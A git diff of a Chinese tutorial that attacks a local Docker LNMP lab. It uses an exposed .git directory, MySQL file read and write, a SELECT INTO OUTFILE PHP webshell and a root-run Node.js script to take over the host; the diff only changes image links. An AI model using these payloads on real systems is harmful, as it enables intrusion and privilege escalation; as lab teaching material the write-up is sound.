@@ -17,7 +17,7 @@
 --
 测试环境为经典的LNMP，即Linux、Nginx、MySQL、PHP架构的网站。Nginx运行了多个虚拟主机，其中PHP网站是一个图片浏览网站，提供简单的上传和浏览图片接口。网站使用git来管理代码版本且git目录可以通过http访问到。
 
-![img](https://z3.ax1x.com/2021/10/14/5Qd9iV.png)
+![img](./images/5Qd9iV.png)
 
 测试环境已打包成docker镜像，感兴趣的同学可以自己构建、运行。下面是启动测试环境的步骤。
 
@@ -43,7 +43,7 @@ $ docker run -p 8002:8002 -p 3306:3306 lnmp
 接下来就可以访问网站了，http://127.0.0.1:8002/。
 
 * 图片上传接口：```http://127.0.0.1:8002/```
-![image](https://z3.ax1x.com/2021/10/16/5GDzOx.png)
+![image](./images/5GDzOx.png)
 
 * 图片浏览接口：```http://127.0.0.1:8002/list.php```
 
@@ -155,11 +155,11 @@ webshell的注入过程大概可以分为下面几个步骤：
 
 首先我们知道了这个网站是提供了图片上传接口的，那么能不能通过这个接口上传一个PHP文件上去呢？让我们来试试。
 
-[![5JamqS.png](https://z3.ax1x.com/2021/10/16/5JamqS.png)](https://imgtu.com/i/5JamqS)
+[![5JamqS.png](./images/5JamqS.png)](./images/5JamqS.png)
 
 上传失败了，应该是对文件名后缀做了检查。那给文件再加个后缀呢？
 
-[![5JaDR1.png](https://z3.ax1x.com/2021/10/16/5JaDR1.png)](https://imgtu.com/i/5JaDR1)
+[![5JaDR1.png](./images/5JaDR1.png)](./images/5JaDR1.png)
 
 还是不行，估计对上传文件的媒体类型也做了检查。而且通过改文件名上传就算上传成功了也不一定能够被PHP解释器执行。一般来说nginx配置PHP-FPM反向代理都是匹配```.php```后缀的文件，也就是说后缀为```.php```的文件nginx才会交给PHP-FPM执行。
 
@@ -206,36 +206,36 @@ fi
 
 在本地初始化一个git项目
 
-![](https://i.bmp.ovh/imgs/2021/10/daa6aa253edb8511.png)
+![](./images/daa6aa253edb8511.png)
 
 
 将最新的object下载下来，可以看到这是个commit对象。
 
-![](https://i.bmp.ovh/imgs/2021/10/03f82fa1b5211778.png)
+![](./images/03f82fa1b5211778.png)
 
 
 把当前commit对象所属的树对象下载下来，这里我们可以看到网站的目录结构了。
 
-![](https://z3.ax1x.com/2021/10/16/5JNVJI.png)
+![](./images/5JNVJI.png)
 
 
 有了目录结构，接下来就可以看到代码内容了。先看看config.php文件有什么。
 
-[![5JNBTJ.png](https://z3.ax1x.com/2021/10/16/5JNBTJ.png)](https://imgtu.com/i/5JNBTJ)
+[![5JNBTJ.png](./images/5JNBTJ.png)](./images/5JNBTJ.png)
 
 这里我们看到config.php中包含了数据连接的配置和上传相关的配置，有地址、用户名、密码。试试能不能登录到数据库。
 
-[![5JUSts.png](https://z3.ax1x.com/2021/10/16/5JUSts.png)](https://imgtu.com/i/5JUSts)
+[![5JUSts.png](./images/5JUSts.png)](./images/5JUSts.png)
 
-[![5JU3nO.png](https://z3.ax1x.com/2021/10/16/5JU3nO.png)](https://imgtu.com/i/5JU3nO)
+[![5JU3nO.png](./images/5JU3nO.png)](./images/5JU3nO.png)
 
 登录到数据库成功！再看看其他的代码，看看upfile.php是什么逻辑。
 
-[![5JdGYd.png](https://z3.ax1x.com/2021/10/16/5JdGYd.png)](https://imgtu.com/i/5JdGYd)
+[![5JdGYd.png](./images/5JdGYd.png)](./images/5JdGYd.png)
 
 这段代码应该是处理图片上传的，而且它对上传的文件扩展名和媒体类型有做检查，接着往下看会发现有一段代码是判断保存上传文件的目录存不存在，如果不存在那么就创建一个目录而且它的文件权限是777。
 
-[![5JwN4J.png](https://z3.ax1x.com/2021/10/16/5JwN4J.png)](https://imgtu.com/i/5JwN4J)
+[![5JwN4J.png](./images/5JwN4J.png)](./images/5JwN4J.png)
 
 
 目前掌握的情况是：
@@ -280,17 +280,17 @@ LOAD DATA INFILE '/etc/passwd' into table t1 FIELDS TERMINATED BY '\n' (content)
 
 读取成功。
 
-[![5JB8kF.png](https://z3.ax1x.com/2021/10/16/5JB8kF.png)](https://imgtu.com/i/5JB8kF)
+[![5JB8kF.png](./images/5JB8kF.png)](./images/5JB8kF.png)
 
 接下来要找到网站的document root在哪里，查看下nginx的配置文件```/etc/nginx/nginx.conf```。
 
-[![5JDicR.png](https://z3.ax1x.com/2021/10/16/5JDicR.png)](https://imgtu.com/i/5JDicR)
+[![5JDicR.png](./images/5JDicR.png)](./images/5JDicR.png)
 
 ```/etc/nginx/nginx.conf```没有发现PHP相关的配置，网站的nginx配置可能在```/etc/nginx/sites-enabled```目录下。
 
 但是文件名是什么呢？先试试```/etc/nginx/sites-enabled/php```。
 
-[![5JDcUU.png](https://z3.ax1x.com/2021/10/16/5JDcUU.png)](https://imgtu.com/i/5JDcUU)
+[![5JDcUU.png](./images/5JDcUU.png)](./images/5JDcUU.png)
 
 找到了，网站的路径在```/var/www/phpupfile```。
 
@@ -299,29 +299,29 @@ MySQL写入文件到磁盘
 
 试试能不能在网站根目录写入文件。
 
-[![5JDHUO.png](https://z3.ax1x.com/2021/10/16/5JDHUO.png)](https://imgtu.com/i/5JDHUO)
+[![5JDHUO.png](./images/5JDHUO.png)](./images/5JDHUO.png)
 
 写入失败了，MySQL是以mysql用户运行的，没有/var/www/phpupfile的写入权限。在```upfile.php```文件中发现```uploads```目录的权限是777，这个权限是可以写入的，再来一次。
 
-[![5Jr0iD.png](https://z3.ax1x.com/2021/10/16/5Jr0iD.png)](https://imgtu.com/i/5Jr0iD)
+[![5Jr0iD.png](./images/5Jr0iD.png)](./images/5Jr0iD.png)
 
 写入成功了。
 
-[![5Jr0iD.png](https://z3.ax1x.com/2021/10/16/5Jr0iD.png)](https://imgtu.com/i/5Jr0iD)
+[![5Jr0iD.png](./images/5Jr0iD.png)](./images/5Jr0iD.png)
 
 访问```curl http://127.0.0.1:8002```看看，好家伙，写入成功了。
 
-[![5JrhFS.png](https://z3.ax1x.com/2021/10/16/5JrhFS.png)](https://imgtu.com/i/5JrhFS)
+[![5JrhFS.png](./images/5JrhFS.png)](./images/5JrhFS.png)
 
 现在可以写webshell了，下面是将一段PHP代码写入到```/var/www/phpupfile/uploads/img.php```文件。这段代码会从url参数中读取命令(command)并执行它。
 
 ```sql
 select '<?php system($_GET["command"] . " 2>&1");' into outfile  '/var/www/phpupfile/uploads/img.php';
 ```
-[![5JsB7V.png](https://z3.ax1x.com/2021/10/16/5JsB7V.png)](https://imgtu.com/i/5JsB7V)
+[![5JsB7V.png](./images/5JsB7V.png)](./images/5JsB7V.png)
 
 执行命令的效果。
-[![5Jsfn1.png](https://z3.ax1x.com/2021/10/16/5Jsfn1.png)](https://imgtu.com/i/5Jsfn1)
+[![5Jsfn1.png](./images/5Jsfn1.png)](./images/5Jsfn1.png)
 
 
 到这里webshell就注入成功了，现在我们可以在服务器执行命令了。不过webshell的执行权限有限，它是以```www-data```用户运行的。
@@ -332,11 +332,11 @@ select '<?php system($_GET["command"] . " 2>&1");' into outfile  '/var/www/phpup
 
 怎么能够拿到更高的权限呢？通过上面执行的```ps auxf```命令可以看到服务器还运行了一个nodejs的脚本。如果可以在这个脚本里面一段代码那么就可以提权了，因为它是以root权限运行的。先看看```/var/www/nodejs/server.js```的权限。
 
-[![5JytUK.png](https://z3.ax1x.com/2021/10/16/5JytUK.png)](https://imgtu.com/i/5JytUK)
+[![5JytUK.png](./images/5JytUK.png)](./images/5JytUK.png)
 
 权限竟然是777，那就好办了，只要往这个脚本追加一段代码，等它下次重启的时候就会被执行，而且是以root用户执行！
 
-[![5JyOGF.png](https://z3.ax1x.com/2021/10/16/5JyOGF.png)](https://imgtu.com/i/5JyOGF)
+[![5JyOGF.png](./images/5JyOGF.png)](./images/5JyOGF.png)
 
 添加一个新用户user1并将其添加到root组中。
 ```
@@ -359,11 +359,11 @@ curl http://127.0.0.1:8002/uploads/img.php?command=echo%20%22try{%20require(%27c
 
 查看是否写入成功。
 
-[![5Jg0v4.png](https://z3.ax1x.com/2021/10/16/5Jg0v4.png)](https://imgtu.com/i/5Jg0v4)
+[![5Jg0v4.png](./images/5Jg0v4.png)](./images/5Jg0v4.png)
 
 写入成功了，等脚本下次运行时就可以知道用户是否创建成功，创建成功的话就可以用该用户登录到服务器。
 
-[![5JgXRS.png](https://z3.ax1x.com/2021/10/16/5JgXRS.png)](https://imgtu.com/i/5JgXRS)
+[![5JgXRS.png](./images/5JgXRS.png)](./images/5JgXRS.png)
 
 
 总结
